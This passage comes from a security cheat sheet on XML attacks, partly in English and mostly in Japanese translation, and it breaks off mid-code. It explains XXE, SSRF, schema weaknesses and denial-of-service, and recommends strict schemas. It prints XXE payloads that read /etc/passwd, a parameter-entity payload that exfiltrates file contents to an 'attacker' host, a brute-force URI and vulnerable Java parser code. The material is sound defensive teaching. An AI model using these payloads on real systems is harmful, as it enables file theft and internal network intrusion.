               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```

#### Reflected File Retrieval

Consider the following example code of an XXE:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```

**The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**

#### Server Side Request Forgery

**Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.** SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.

##### External DNS Resolution

**Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.** This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```

##### External Connection

Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

##### File Retrieval with Parameter Entities

Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```

Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```

The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.

##### Port Scanning

The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:

**1) Complete Disclosure**: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.

**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```

**3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.

**4) Time-based**: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.

##### Brute Forcing

**Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc).** For example, see the following example:

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

</section>

<section id="xml-security-translation-panel" className="tabPanel translationPanel contentPanel">

## はじめに

XML と XML スキーマの仕様は XML アプリケーションを保護するために必要な手段を提供しますが、同時に複数のセキュリティ上の弱点も含んでいます。これらは、ファイル取得、サーバーサイドリクエストフォージェリ、ポートスキャン、ブルートフォースなど、複数種類の攻撃に悪用される可能性があります。このチートシートでは、ライブラリやソフトウェアで使われる XML のさまざまな機能を攻撃者がどのように悪用できるかを、次の二つの攻撃面に分けて理解できるようにします。

- **不正形式の XML 文書 (Malformed XML Documents)**: アプリケーションが整形式でない XML 文書に遭遇したときに発生する脆弱性を悪用するものです。
- **無効な XML 文書 (Invalid XML Documents)**: 文書が期待された構造を持たないときに発生する脆弱性を悪用するものです。

## 不正形式の XML 文書への対処

### 不正形式の XML 文書の定義

XML 文書が W3C XML 仕様における整形式文書の定義に従っていない場合、その文書は「不正形式」と見なされます。**XML 文書が不正形式である場合、XML パーサは致命的エラーを検出し、実行を停止すべきであり、その文書を追加処理してはならず、アプリケーションはエラーメッセージを表示すべきです。** 不正形式の文書には、終了タグの欠落、要素順序の無意味な構造化、禁止文字の導入など、一つ以上の問題が含まれることがあります。

### 不正形式の XML 文書の取り扱い

**不正形式の文書に対処するため、開発者は W3C 仕様に従い、不正形式の文書の処理に著しい追加時間を要しない XML プロセッサを使用すべきです。** さらに、整形式文書のみを使用し、各要素の内容を検証し、事前定義された境界内の有効な値だけを処理すべきです。

#### 不正形式の XML 文書は追加時間を必要とする

**不正形式の文書は Central Processing Unit (CPU) リソースの消費に影響する可能性があります。** 特定のシナリオでは、不正形式の文書を処理するために必要な時間が、整形式文書の処理時間よりも長くなることがあります。この場合、攻撃者は処理時間の増加を利用する非対称リソース消費攻撃を悪用し、サービス拒否 (Denial of Service: DoS) を引き起こす可能性があります。

**この攻撃の起こりやすさを分析するには、通常の XML 文書にかかる時間と、同じ文書の不正形式版にかかる時間を比較します。** そのうえで、攻撃者が複数の文書を使う XML flood 攻撃とこの脆弱性を組み合わせ、影響を増幅できるかを検討してください。

### 不正形式データを処理するアプリケーション

**一部の XML パーサには、不正形式の文書を復元する能力があります。** 仕様に準拠していない文書であっても、解析できたすべての内容を含む有効なツリーをできる限り返すよう指示できます。**復元プロセスには事前定義された規則がないため、これらのパーサのアプローチと結果は常に同じとは限りません。不正形式の文書を使用すると、データ整合性に関する予期しない問題につながる可能性があります。**

次の二つのシナリオは、復元モードでパーサが分析する攻撃ベクトルを示しています。

#### 不正形式文書から不正形式文書へ

XML 仕様によると、文字列 `--` (二重ハイフン) はコメント内に出現してはなりません。lxml と PHP の復元モードを使用すると、次の文書は復元後も同じままになります。

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

#### 整形式文書から正規化された整形式文書へ

一部のパーサは、`CDATA` セクションの内容を正規化することがあります。これは、必須ではないにもかかわらず、`CDATA` セクションに含まれる特殊文字を安全な表現に更新することを意味します。

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

`CDATA` セクションの正規化は、パーサ間で共通の規則ではありません。Libxml はこの文書を正準形式に変換する可能性がありますが、整形式ではあっても、状況によっては内容が不正形式と見なされる可能性があります。

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

### 強制的な解析への対処

**XML における一般的な強制型攻撃の一つは、対応する終了タグを持たない深くネストされた XML 文書を解析させることです。狙いは、被害者にマシンのリソースを使い切らせ、最終的に枯渇させて、対象にサービス拒否を発生させることです。** Firefox 3.67 における DoS 攻撃の報告には、対応する終了タグを持たない 30,000 個の開始 XML 要素の使用が含まれていました。終了タグを削除すると、同じ結果を達成するために整形式文書の半分のサイズだけで済むため、攻撃が単純になります。処理されるタグ数により、最終的にスタックオーバーフローが発生しました。このような文書の単純化した例は次のようになります。

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

## XML 仕様規則への違反

W3C 仕様に従わないパーサを使用して文書を操作すると、予期しない結果が生じる可能性があります。**ソフトウェアが不正な XML 構造の扱いを適切に検証しない場合、クラッシュやコード実行を達成できる可能性があります。ファジングされた XML 文書をソフトウェアに与えることで、この挙動が露呈する可能性があります。**

## 無効な XML 文書への対処

**攻撃者は、文書に有効な値セットが含まれているかをアプリケーションが検証しないことを悪用するため、予期しない値を文書に導入する可能性があります。** スキーマは文書が有効かどうかを識別するための制約を指定します。有効な文書は整形式であり、スキーマの制約に準拠しています。一つの文書の検証には複数のスキーマを使用でき、これらの制約は単一のスキーマ言語を使用する場合でも、複数のスキーマ言語の強みを利用する場合でも、複数のファイルに現れることがあります。

これらの脆弱性を避けるための推奨事項は、各 XML 文書に対して、( [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) ではなく) 正確に定義された XML Schema を持たせ、不適切なデータ検証の問題を避けるために、すべての情報を適切に制限することです。XML 文書内で提供されるスキーマ参照ではなく、ローカルコピーまたは既知の良好なリポジトリを使用してください。また、参照される XML スキーマファイルについて、リポジトリが侵害される可能性も考慮しながら、整合性チェックを実施してください。XML 文書がリモートスキーマを使用する場合は、攻撃者によるネットワークトラフィックの盗聴を防ぐため、サーバーを安全な暗号化通信のみを使用するよう構成してください。

### スキーマのない文書

ある書店が、Web インターフェースを通じてトランザクションを行う Web サービスを使用しているとします。トランザクション用の XML 文書は、商品に関連する `id` 値と特定の `price` という二つの要素で構成されます。ユーザーは Web インターフェースを使って特定の `id` 値だけを入力できます。

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

**文書構造に制御がない場合、アプリケーションは意図しない結果を伴う別の整形式メッセージも処理してしまう可能性があります。前述の文書には、その内容を処理する基盤アプリケーションの挙動に影響する追加タグを含めることができたかもしれません**。

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

値 123 が再び `id` として提供されている点に注意してください。ただし、今度は文書に追加の開始タグと終了タグが含まれています。攻撃者は `id` 要素を閉じ、偽の `price` 要素を値 0 に設定します。構造を整形式に保つ最後の手順として、空の `id` 要素を一つ追加します。その後、アプリケーションは `id` の終了タグを追加し、`price` を 10 に設定します。アプリケーションが構造に対する制御を一切行わず、ID と値について最初に提供された値だけを処理する場合、攻撃者は実際には支払わずに本を購入できるようになり、利益を得る可能性があります。

### 制約の弱いスキーマ

**一部のスキーマは、各要素が受け取れるデータ型に対して十分な制約を提供しません。** これは通常、[DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合に発生します。DTD は、XML 文書に適用できる制約の種類と比べて、非常に限られた可能性しか持ちません。そのため、他のスキーマ言語を使用すれば容易に制約できる要素や属性内の望ましくない値に、アプリケーションがさらされる可能性があります。次の例では、人物の `age` がインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマに対して検証されます。

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

前述の文書には、`person` という名前のルート要素を持つインライン [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) が含まれています。この要素には、特定の順序で二つの要素、つまり `name` と `age` が含まれます。その後、`name` 要素は `age` 要素と同様に `PCDATA` を含むよう定義されています。

この定義の後に、整形式かつ有効な XML 文書が始まります。`name` 要素には重要でない値が含まれていますが、`age` 要素には 100 万桁の数字が含まれています。`age` 要素の最大サイズに制約がないため、この 100 万桁の文字列をこの要素としてサーバーに送信できます。

通常、この種の要素は、一定数以下の文字を含むよう制限し、特定の文字セット (たとえば 0 から 9 の数字、プラス記号、マイナス記号) に制約すべきです。適切に制限されていない場合、アプリケーションは文書内に含まれる潜在的に無効な値を扱う可能性があります。

特定の制約 (`name` 要素の最大長や `age` 要素の有効範囲など) を示せないため、この種のスキーマはリソースの完全性と可用性に影響するリスクを高めます。

### 不適切なデータ検証

**スキーマが安全でない形で定義され、厳格な規則を提供しない場合、アプリケーションをさまざまな状況にさらす可能性があります。その結果、内部エラーの開示や、予期しない値によってアプリケーション機能に影響する文書が発生する可能性があります。**

#### 文字列データ型

16 進値を使用する必要がある場合、その値を文字列として定義し、後で特定の 16 個の 16 進文字に制限する意味はありません。このシナリオを例示すると、XML 暗号化を使用する場合、一部の値は base64 でエンコードする必要があります。これらの値がどのように見えるべきかを示すスキーマ定義は次のとおりです。

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

前述のスキーマは、`CipherValue` 要素を base64 データ型として定義しています。一例として、IBM WebSphere DataPower SOA Appliance は、有効な base64 値の後にこの要素内で任意の種類の文字を許可し、それを有効と見なしていました。

このデータの最初の部分は base64 値として適切にチェックされますが、残りの文字はほかの任意のものになり得ます (`CipherData` 要素の別のサブ要素を含む)。要素に対する制約が部分的にしか設定されていないため、情報は提案されたサンプルスキーマではなく、アプリケーションを使ってテストされている可能性があります。

#### 数値データ型

**数値には文字列より多くの選択肢があるため、正しいデータ型を定義することはより複雑になる可能性があります。**

##### 負数と正数の制約

XML Schema の数値データ型には、さまざまな数値範囲を含められます。次のものがあります。

- **negativeInteger**: 負数のみ
- **nonNegativeInteger**: 正数とゼロ値
- **positiveInteger**: 正数のみ
- **nonPositiveInteger**: 負数とゼロ値

次のサンプル文書は、商品の `id`、`price`、および攻撃者の制御下にある `quantity` 値を定義しています。

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

**過去の誤りを繰り返さないために、攻撃者が追加要素を導入しようとする場合に不正な構造の処理を防ぐ XML スキーマを定義できます。**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

`quantity` を整数データ型に制限すると、予期しない文字を避けられます。アプリケーションが前述のメッセージを受信すると、`price*quantity` を計算して最終価格を求める可能性があります。**しかし、このデータ型は負の値を許容する可能性があるため、攻撃者が負数を提供するとユーザーアカウントに負の結果を許す可能性があります。この論理的脆弱性を避けるためにここでおそらく必要なのは、integer ではなく positiveInteger です。**

##### ゼロ除算

**ユーザー制御値を除算の分母として使用する場合、開発者はゼロを許可しないようにすべきです。XSLT で値ゼロが除算に使用されると、エラー `FOAR0001` が発生します。ほかのアプリケーションでは別の例外が投げられ、プログラムがクラッシュする可能性があります。** XML スキーマには、ゼロ値の使用を明確に避ける特定のデータ型があります。たとえば、負の値とゼロが有効でない場合、スキーマはその要素に `positiveInteger` データ型を指定できます。

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

`denominator` 要素は正の整数に制限されます。これは、ゼロより大きい値だけが有効と見なされることを意味します。他の種類の制約が使用されている場合、分母がゼロであればエラーを引き起こす可能性があります。

##### 特殊値: Infinity と Not a Number (NaN)

`float` と `double` データ型には、実数といくつかの特殊値、つまり `-Infinity` または `-INF`、`NaN`、`+Infinity` または `INF` が含まれます。これらの可能性は特定の値を表すのに便利な場合がありますが、誤用されることもあります。問題は、これらが価格などの実数だけを表すためによく使われる点です。これは、これらの技術だけに限定されず、ほかのプログラミング言語でも見られる一般的な誤りです。

データ型で取り得る値の全体像を考慮しないと、基盤アプリケーションが失敗する可能性があります。**特殊値 `Infinity` と `NaN` が不要で、実数だけが期待される場合は、データ型 `decimal` が推奨されます。**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

**価格値を Infinity または NaN に設定しても、それらの値は有効ではないため、エラーは引き起こされません。これらの値が許可されている場合、攻撃者はこの問題を悪用できます。**

#### 一般的なデータ制約

適切なデータ型を選択した後、開発者は追加の制約を適用できます。データ型内の特定の値のサブセットだけが有効と見なされる場合があります。

##### 接頭辞付きの値

**一部の種類の値は特定の集合だけに制限すべきです。信号機には三種類の色しかなく、利用可能な月は 12 個だけ、というようなものです。スキーマが各要素または属性についてこれらの制約を備えている可能性があります。これはアプリケーションにとって最も完全な許可リストのシナリオです。特定の値だけが受け入れられます。このような制約は XML スキーマでは `enumeration` と呼ばれます。** 次の例は、month 要素の内容を 12 個の可能な値に制限します。

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

month 要素の値を前述のいずれかの値に制限することで、アプリケーションはランダムな文字列を操作しなくなります。

##### 範囲

ソフトウェアアプリケーション、データベース、プログラミング言語は通常、特定の範囲内に情報を格納します。**特定のサイズが重要な場所で要素または属性を使用する場合 (オーバーフローまたはアンダーフローを避けるため)、データ長が有効と見なされるかどうかをチェックするのは合理的です。** 次のスキーマは、異常なシナリオを避けるため、名前を最小長と最大長で制約できます。

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

可能な値が特定の長さ (たとえば 8) に制限される場合、有効にするために次のようにこの値を指定できます。

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

##### パターン

一部の要素または属性は特定の構文に従うことがあります。XML スキーマを使用する場合、`pattern` 制約を追加できます。**データが特定のパターンに準拠していることを保証したい場合、そのための特定の定義を作成できます。社会保障番号 (SSN) は良い例です。SSN は特定の文字セット、特定の長さ、特定の `pattern` を使用しなければなりません。**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

SSN の値としては、`000-00-0000` から `999-99-9999` までの数字だけが許可されます。

##### アサーション

**アサーションコンポーネントは、XML スキーマ上の関連要素と属性の存在および値を制約します。要素または属性は、テストがエラーを発生させずに true と評価された場合にのみ、アサーションに関して有効と見なされます。変数 `$value` を使用して、分析対象の値の内容を参照できます。**

前述の *ゼロ除算* セクションでは、分母にゼロ値を含むデータ型を使用した場合の潜在的な結果を参照し、正の値だけを含むデータ型を提案しました。逆の例として、ゼロを除く数値範囲全体を有効と見なすことが考えられます。潜在的なエラーの開示を避けるため、ゼロを許可しない `assertion` を使用して値をチェックできます。

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

このアサーションは、`denominator` が有効な数値として値ゼロを含まないことを保証し、同時に負数を有効な分母として許可します。

##### 出現回数

**最大出現回数を定義しないことの結果は、処理対象アイテムの極端な数を受け取った場合に起こり得る結果に対処するよりも悪くなる可能性があります。** 最小制限と最大制限を指定する二つの属性は、`minOccurs` と `maxOccurs` です。

`minOccurs` と `maxOccurs` の両方のデフォルト値は `1` ですが、一部の要素には別の値が必要になることがあります。たとえば、値が任意である場合は `minOccurs` に 0 を含められ、最大数に制限がない場合は、次の例のように `maxOccurs` に `unbounded` を含められます。

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

前述のスキーマには `operation` という名前のルート要素が含まれ、その中に無制限 (`unbounded`) の buy 要素を含められます。開発者は通常、出現回数の最大値を制限したがらないため、これは一般的な所見です。**無制限の出現回数を使用するアプリケーションは、処理対象となる非常に大量の要素を受信した場合に何が起こるかをテストすべきです。計算リソースは有限であるため、結果を分析し、最終的には `unbounded` 値ではなく最大数を使用すべきです。**

### ジャンボペイロード

**1GB の XML 文書を送信してもサーバー処理は 1 秒しか必要とせず、攻撃として検討する価値がない場合があります。その代わり、攻撃者はこの種の攻撃を生成するために使用する CPU とトラフィックを、サーバーがリクエストを処理するために使用する総 CPU またはトラフィック量と比べて最小化する方法を探します。**

#### 従来型ジャンボペイロード

**文書を通常より大きくする主な方法は二つあります。**

**- 深さ攻撃: 大量の要素、要素名、要素値を使用します。**

**- 幅攻撃: 大量の属性、属性名、属性値を使用します。**

ほとんどの場合、全体として巨大な文書になります。これはどのように見えるかを示す短い例です。

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

#### 「小さな」ジャンボペイロード

**次の例は非常に小さな文書ですが、これを処理した結果は従来型ジャンボペイロードを処理した場合と似たものになる可能性があります。** このような小さなペイロードの目的は、攻撃者が十分な速さで多数の文書を送信し、アプリケーションに利用可能なリソースの大部分またはすべてを消費させられるようにすることです。

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

### スキーマポイズニング

**攻撃者がスキーマに変更を導入できる場合、複数の高リスクな結果が生じる可能性があります。特に、スキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用している場合、その結果の影響はより危険になります (例: ファイル取得、サービス拒否)。** 攻撃者は、常にスキーマの場所に依存しながら、多数のシナリオでこの種の脆弱性を悪用できます。

#### ローカルスキーマポイズニング

**ローカルスキーマポイズニングは、スキーマが同じホスト上で利用可能な場合に発生します。そのスキーマが同じ XML 文書に埋め込まれているかどうかは問いません。**

##### 埋め込みスキーマ

**最も単純なスキーマポイズニングは、スキーマが同じ XML 文書内に定義されている場合に発生します。** W3C が提供した、意図せず脆弱な次の例を考えてください。

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

note 要素に対するすべての制約を削除または変更でき、任意の種類のデータをサーバーに送信できるようになります。さらに、サーバーが外部エンティティを処理している場合、攻撃者はスキーマを使って、たとえばサーバーからリモートファイルを読み取ることができます。**この種のスキーマは文書送信用の提案としてしか機能しないため、安全に使用するには埋め込みスキーマの整合性をチェックする方法を含めなければなりません。埋め込みスキーマを通じた攻撃は、外部エンティティ展開の悪用によく使われます。埋め込み XML スキーマは、内部ホストのポートスキャンやブルートフォース攻撃にも役立つ可能性があります。**

##### 不適切な権限

**ローカルスキーマを処理することで、リモートで改ざんされたバージョンを使用するリスクを回避できることがよくあります。**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

**しかし、ローカルスキーマに正しい権限が設定されていない場合、内部攻撃者が元の制約を変更できる可能性があります。** 次の行は、任意のユーザーが変更できる権限を持つスキーマの例です。

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

`name.dtd` に設定された権限により、システム上の任意のユーザーが変更を加えられます。この脆弱性は XML やスキーマの構造とは明らかに関係ありませんが、これらの文書は一般にファイルシステムに保存されるため、攻撃者がこの種の問題を悪用できることは言及する価値があります。

#### リモートスキーマポイズニング

**外部組織によって定義されるスキーマは通常、リモートで参照されます。攻撃者がネットワークトラフィックを迂回またはアクセスできる場合、本来意図されたものとは異なる種類のコンテンツを被害者に取得させる可能性があります。**

##### Man-in-the-Middle (MitM) 攻撃

文書が暗号化されていない Hypertext Transfer Protocol (HTTP) を使用してリモートスキーマを参照する場合、通信は平文で行われ、攻撃者はトラフィックを容易に改ざんできます。**XML 文書が HTTP 接続を使用してリモートスキーマを参照する場合、その接続はエンドユーザーに届く前に盗聴および変更される可能性があります。**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

リモートファイル `note.dtd` は、暗号化されていない HTTP プロトコルで送信される場合、改ざんされやすい可能性があります。この種の攻撃を容易にするために利用できるツールの一つが mitmproxy です。

##### DNS キャッシュポイズニング

リモートスキーマポイズニングは、Hypertext Transfer Protocol Secure (HTTPS) のような暗号化プロトコルを使用している場合でも可能なことがあります。**ソフトウェアが IP アドレスに対して逆 Domain Name System (DNS) 解決を実行してホスト名を取得する場合、その IP アドレスが本当にそのホスト名に関連付けられていることを適切に保証しない可能性があります。** この場合、ソフトウェアは攻撃者がコンテンツを自分の Internet Protocol (IP) アドレスにリダイレクトできるようにします。

前述の例では、暗号化されていないプロトコルを使用してホスト `example.com` を参照していました。

HTTPS に切り替えると、リモートスキーマの場所は `https://example/note.dtd` のようになります。通常のシナリオでは、`example.com` の IP は `1.1.1.1` に解決されます。

```bash
$ host example.com
example.com has address 1.1.1.1
```

攻撃者が使用中の DNS を侵害すると、前述のホスト名は攻撃者が制御する新しい別の IP `2.2.2.2` を指す可能性があります。

```bash
$ host example.com
example.com has address 2.2.2.2
```

リモートファイルにアクセスすると、被害者は実際には攻撃者が制御する場所の内容を取得している可能性があります。

##### 悪意ある従業員による攻撃

第三者がスキーマをホストして定義している場合、その内容はスキーマ利用者の管理下にはありません。**悪意ある従業員、またはこれらのファイルを制御する外部攻撃者によって導入された変更は、スキーマを処理するすべてのユーザーに影響する可能性があります。その後、攻撃者はほかのサービスの機密性、完全性、可用性に影響を与える可能性があります (特に使用中のスキーマが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の場合)。**

### XML エンティティ展開

**パーサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を使用する場合、攻撃者は文書処理中に XML パーサへ悪影響を与える可能性のあるデータを注入するかもしれません。これらの悪影響には、パーサのクラッシュやローカルファイルへのアクセスが含まれる可能性があります。**

#### 脆弱な Java 実装のサンプル

**ローカルまたはリモートファイルを参照する [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) の機能を使用すると、ファイルの機密性に影響を与えることが可能です。** さらに、エンティティ展開に適切な制約が設定されていない場合、リソースの可用性にも影響を与えることが可能です。XXE の次のサンプルコードを考えてください。

**サンプル XML**:

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

**サンプル DTD**:

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

##### DOM を使った XXE

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```

前述のコードは次の出力を生成します。

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### DOM4J を使った XXE

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
